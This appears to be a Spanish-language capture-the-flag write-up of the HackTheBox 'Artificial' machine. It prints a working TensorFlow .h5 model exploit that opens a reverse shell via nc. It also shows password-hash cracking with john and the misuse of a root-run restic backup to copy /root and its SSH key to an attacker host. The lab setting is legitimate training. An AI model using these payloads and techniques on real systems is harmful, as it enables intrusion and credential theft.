+++ 
draft = false
date = 2025-11-25T23:43:48Z
title = "Artificial Machine - HackTheBox"
description = ""
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Linux
----------------
# Enumeración Nmap
**Comando:**
```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts
```
<img src="/images/Pasted image 20250918024121.png" style="width:100%; height:auto; display:block; margin:auto;">
Utilizamos whatweb para sacar más información del sitio web y nos da el nombre de dominio http://artificial.htb
<img src="/images/Pasted image 20250918024227.png" style="width:100%; height:auto; display:block; margin:auto;">
lo cual agregamos a nuestro /etc/hosts
<img src="/images/Pasted image 20250918024249.png" style="width:100%; height:auto; display:block; margin:auto;">
# Enumeración puerto HTTP 80

Entramos a la página web y solo tenemos dos opciones /login /register
<img src="/images/Pasted image 20250918024424.png" style="width:100%; height:auto; display:block; margin:auto;">
Además nos aparece un código de ejemplo de un archivo .h5 que es usado para IAs
<img src="/images/Pasted image 20250918024511.png" style="width:100%; height:auto; display:block; margin:auto;">
Nos registramos al sitio web
<img src="/images/Pasted image 20250918024549.png" style="width:100%; height:auto; display:block; margin:auto;">
y nos logueamos y vemos que nos da la posibilidad de subir un archivo .h5
<img src="/images/Pasted image 20250918024651.png" style="width:100%; height:auto; display:block; margin:auto;">
Además encontramos dos archivos interesantes para descargar, el primero requirements, el cual nos da la versión de tensorflow-cpu=2.13.1
y el Dockerfile para compilar nuestro archivo .h5
<img src="/images/Pasted image 20250918030336.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotación

Buscando por vulnerabilidad de tensorflow 2.13.1 encontramos cve 2024-3660, por tanto buscamos un poc y tenemos la primera página github
<img src="/images/Pasted image 20250918031135.png" style="width:100%; height:auto; display:block; margin:auto;">
Nos vamos al exploit.py que tiene el siguiente código con reverse shell
<img src="/images/Pasted image 20250918031211.png" style="width:100%; height:auto; display:block; margin:auto;">
```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Para correr el script necesitamos tener instalado  tensorflow, para eso utilizaremos el archivo Dockerfile que nos dió la web

haremos el siguiente comando para crear la imagen
```bash
docker build -t python_tensor .
```
<img src="/images/Pasted image 20250918031617.png" style="width:100%; height:auto; display:block; margin:auto;">

Posteriormente utilizaremos el siguiente comando para entrar en la imagen
```bash
docker run -it --rm python_tensor
```
<img src="/images/Pasted image 20250918031742.png" style="width:100%; height:auto; display:block; margin:auto;">

Una vez dentro del contenedor, instalamos nano para crear nuestros script en python
```bash
apt-get update && apt-get install -y nano
```

Y creamos nuestro exploit.py con el script que encontramos en github, editando la IP y puerto en escucha
<img src="/images/Pasted image 20250918032005.png" style="width:100%; height:auto; display:block; margin:auto;">
ahora corremos el script y nos creará el archivo "exploit.h5" 
<img src="/images/Pasted image 20250918032122.png" style="width:100%; height:auto; display:block; margin:auto;">
Pasamos el exploit.h5 hacia nuestra máquina local con el siguiente comando
```bash
docker ps
docker cp [id del contenedor]:/code/exploit.h5 /home/kali/Desktop/Artificial/exploit.h5
```
<img src="/images/Pasted image 20250918032516.png" style="width:100%; height:auto; display:block; margin:auto;">

Con el archivo en nuestra máquina local, nos pondremos en escucha, y subiremos el exploit.h5
<img src="/images/Pasted image 20250918032643.png" style="width:100%; height:auto; display:block; margin:auto;">
<img src="/images/Pasted image 20250918032657.png" style="width:100%; height:auto; display:block; margin:auto;">
Consiguiendo consola
# Tratamiento tty

```bash
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 39 columns 157
```

# Movimiento lateral

Dentro del sistema, vemos 3 usuarios con consola. app, gael y root.
Por tanto nuestro objetivo será migrar hacia el usuario gael
<img src="/images/Pasted image 20250918033954.png" style="width:100%; height:auto; display:block; margin:auto;">


Una vez dentro de la máquina víctima nos encontramos las siguientes carpetas, dentro de instance encontramos users.db
<img src="/images/Pasted image 20250918033232.png" style="width:100%; height:auto; display:block; margin:auto;">

Nos conectaremos a la base de datos con sqlite3, debido que en el archivo app.py nos muestra que se usa esa base de datos
<img src="/images/Pasted image 20250918033411.png" style="width:100%; height:auto; display:block; margin:auto;">

```bash
sqlite3 users.db
```

Dentro de la base de datos tenemos dos tablas, model y user
en la tabla user tenemos usuarios, correos y contraseñas hasheadas
<img src="/images/Pasted image 20250918033542.png" style="width:100%; height:auto; display:block; margin:auto;">
Guardamos el hash del usuario gael
<img src="/images/Pasted image 20250918034019.png" style="width:100%; height:auto; display:block; margin:auto;">
Analizandolo podemos ver que es un hash en md5, por tanto utilizaremos john para desencriptarlo, con el siguiente comando

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
```
<img src="/images/Pasted image 20250918034806.png" style="width:100%; height:auto; display:block; margin:auto;">
La contraseña es: mattp005numbertwo, por tanto nos conectaremos por ssh con el usuario gael y esa contraseña

```bash
ssh gael@artificial.htb
```
<img src="/images/Pasted image 20250918034933.png" style="width:100%; height:auto; display:block; margin:auto;">

Obtenemos la flag de user.txt
57d1b624447107af7760f746fe049faa
<img src="/images/Pasted image 20250918181854.png" style="width:100%; height:auto; display:block; margin:auto;">
# Escalada de privilegios

Viendo los puertos activos en la máquina víctima tenemos el puerto 5000, que es el que está corriendo el puerto 80 y el puerto 9898
```bash
ss -alpn | grep "127.0.0.1"
```
<img src="/images/Pasted image 20250918184133.png" style="width:100%; height:auto; display:block; margin:auto;">

Realizaremos un local portfowarding para ver el servicio del puerto 9898
```bash
ssh -L [puerto_local]:localhost:[puerto_remoto] usuario@servidor_ssh
```
En este caso
```bash
ssh -L 9898:localhost:9898 gael@artificial.htb
```
<img src="/images/Pasted image 20250918184408.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora abrimos un navegador y usamos http://localhost:9898
<img src="/images/Pasted image 20250918184608.png" style="width:100%; height:auto; display:block; margin:auto;">Buscamos en internet qué es backrest, y encontramos que es una aplicación web para hacer backup's para una aplicación CLI llamada restic backup
<img src="/images/Pasted image 20250918185725.png" style="width:100%; height:auto; display:block; margin:auto;">
por tanto buscaremos archivos backup en el sistema
```bash
find / -name *backup*  2>/dev/null | grep -vE "lib|headers"
```

<img src="/images/Pasted image 20250918190524.png" style="width:100%; height:auto; display:block; margin:auto;">

el archivo backrest_backup.tar.gz parece interesante, lo copiamos a nuestra carpeta /tmp
```bash
cp /var/backups/backrest_backup.tar.gz /tmp/backrest_backup.tar.gz
```
y luego lo descomprimimos con tar

```bash
tar -xf backrest_backup.tar.gz
```
<img src="/images/Pasted image 20250918190818.png" style="width:100%; height:auto; display:block; margin:auto;">
vamos a la carpeta backrest y hacemos ls -la, donde encontramos una carpeta .config
<img src="/images/Pasted image 20250918190852.png" style="width:100%; height:auto; display:block; margin:auto;">
Dentro de ella hay otra carpeta backrest, y dentro hay un archivo config.json
<img src="/images/Pasted image 20250918190922.png" style="width:100%; height:auto; display:block; margin:auto;">
El archivo contiene nombre de usuario: backrest_root y contraseña: JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP
<img src="/images/Pasted image 20250918191029.png" style="width:100%; height:auto; display:block; margin:auto;">
La contraseña dice ser bcrypt pero no tiene el formato correcto, parece estar en base64, por tanto haremos un base64 -d 
```bash
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d
```
<img src="/images/Pasted image 20250918191210.png" style="width:100%; height:auto; display:block; margin:auto;">
Ahora parece estar bien el hash bcrypt, lo guardamos en un archivo llamado bcrypt.txt y utilizaremos john para descifrarlo
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt bcrypt.txt
```
Consiguiendo la contraseña `!@#$%^`
<img src="/images/Pasted image 20250918191413.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto nos conectaremos a backrest web con las siguientes credenciales
`backrest_root:!@#$%^`
Nos conectamos exitosamente 
<img src="/images/Pasted image 20250918191557.png" style="width:100%; height:auto; display:block; margin:auto;">

## Abusando de restic sudo

Para escalar privilegios aprovecharemos que  restic se corre como root, para eso realizaremos una copia de seguridad de /root/ y la enviaremos a nuestra máquina local, para ver la flag root.txt y además ver sus claves rsa

### Descargando restic server

En nuestra máquina local necesitamos descargar restic-server

```bash
git clone https://github.com/restic/rest-server.git
cd rest-server
```

Además necesitaremos instalar go, podemos buscar en internet como hacerlo.
Luego de tener go hacemops los siguientes comandos

```bash
GOARCH=amd64 GOOS=linux go build -o rest-server ./cmd/rest-server  
./rest-server --path /tmp/restictemp --listen :8888 --no-auth
```
<img src="/images/Pasted image 20250918192309.png" style="width:100%; height:auto; display:block; margin:auto;">
### Creamos el repositorio en la web

En la web creamos el repositorio con los siguientes datos

```
Name: backuprepo  
Repository URI: /opt/backrest  
Password: test12345
```

<img src="/images/Pasted image 20250918192446.png" style="width:100%; height:auto; display:block; margin:auto;">Y le damos a Submit
<img src="/images/Pasted image 20250918192504.png" style="width:100%; height:auto; display:block; margin:auto;">

### Corremos comandos en backrest

En la web vamos al apartado de nuestro repositorio creado y le damos a "Run command"
<img src="/images/Pasted image 20250918192641.png" style="width:100%; height:auto; display:block; margin:auto;">en "Run command" escribimos los siguientes comandos

```bash
-r rest:http://10.10.14.49:8888/backuprepo init
```
<img src="/images/Pasted image 20250918192912.png" style="width:100%; height:auto; display:block; margin:auto;">

Luego ponemos el siguiente comando, que hace el backup de la carpeta /root de la máquina víctima
```bash
-r rest:http://10.10.14.49:8888/backuprepo backup /root
```

Si todo salió bien tenemos los dos iconos de consola verde
<img src="/images/Pasted image 20250918193500.png" style="width:100%; height:auto; display:block; margin:auto;">
### Recuperar el backup en máquina local

Ahora en nuestra *Máquina local* utilizaremos los siguientes comandos para obtener los backups de la máquina víctima

```bash
restic -r /tmp/restictemp/backuprepo snapshots  
```
y ponemos la contraseña que creamos "test12345"
<img src="/images/Pasted image 20250918193538.png" style="width:100%; height:auto; display:block; margin:auto;">

Acá debemos poner el ID que aparece como output en el comando anterior
```bash
restic -r /tmp/restictemp/backuprepo restore <snapshot_id> --target /tmp/restore
```
y ponemos nuevamente la contraseña "test12345"
<img src="/images/Pasted image 20250918193722.png" style="width:100%; height:auto; display:block; margin:auto;">
y finalmente obtenemos el backup de /root/ de la máquina víctima en /tmp/restore de nuestra máquina local
```bash
cd /tmp/restore
```
<img src="/images/Pasted image 20250918193825.png" style="width:100%; height:auto; display:block; margin:auto;">
y obtenemos la flag de root.txt
<img src="/images/Pasted image 20250918193856.png" style="width:100%; height:auto; display:block; margin:auto;">

# Post explotación

Conseguiremos la conexión a la máquina mediante el robo de su clave RSA

ya tenemos el id_rsa del usuario root de la máquina víctima
<img src="/images/Pasted image 20250918194113.png" style="width:100%; height:auto; display:block; margin:auto;">
por tanto cambiaremos los permisos a 400 con el siguiente comando

```bash
chmod 400 id_rsa
```

<img src="/images/Pasted image 20250918194217.png" style="width:100%; height:auto; display:block; margin:auto;">

y nos conectaremos por ssh de la siguiente forma

```bash
ssh -i id_rsa root@artificial.htb
```

<img src="/images/Pasted image 20250918194328.png" style="width:100%; height:auto; display:block; margin:auto;">

y así pwneamos la máquina
<img src="/images/Pasted image 20250918194352.png" style="width:100%; height:auto; display:block; margin:auto;">
